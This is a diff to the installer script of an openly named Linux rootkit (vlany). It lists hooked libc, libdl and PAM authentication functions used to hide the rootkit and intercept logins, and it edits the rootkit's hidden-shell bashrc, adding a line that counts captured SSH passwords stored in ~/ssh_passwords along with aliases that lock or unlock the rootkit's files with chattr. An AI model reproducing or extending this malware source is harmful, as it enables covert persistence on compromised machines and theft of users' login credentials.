@@ -110,6 +110,7 @@ LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
              "syslog", "__syslog_chk", "socket", "login",
              "setegid", "pututxline", "getutid", "getutxid",
              "getutmp", "getutmpx", "updwtmp", "updwtmpx"] # return original address for all of these libc functions
+
 LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
 LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...
 
@@ -355,10 +356,10 @@ if [ $(id -u) != 0 ]; then kill -9 $$; fi
 if [ -f "README" ]; then cat README | less; rm -f README; fi
 
 clear
-cat .shell_msg
+cat ~/.shell_msg
 
 PROMPT_COMMAND='PS1="[\\033[1;31m\u@\h\\033[0m:\\033[1;34m\w\\033[0m]$ "'
-printf "\\033[1m"; w; echo ""; cat .vlany_information; printf "\\033[0m"
+printf "\\033[1m"; w; echo ""; cat ~/.vlany_information; printf "\\033[0m"
 
 alias ls='ls --color=auto'
 alias l=ls
@@ -374,7 +375,10 @@ alias emerge=apt-get
 alias pacman=apt-get
 
 alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
-alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'"""
+alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
+
+echo -e "\\033[1mLogged login attempts: \\033[1;32m$(grep Username ~/ssh_passwords | wc -l)\\033[0m"
+"""
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
     fd.close()
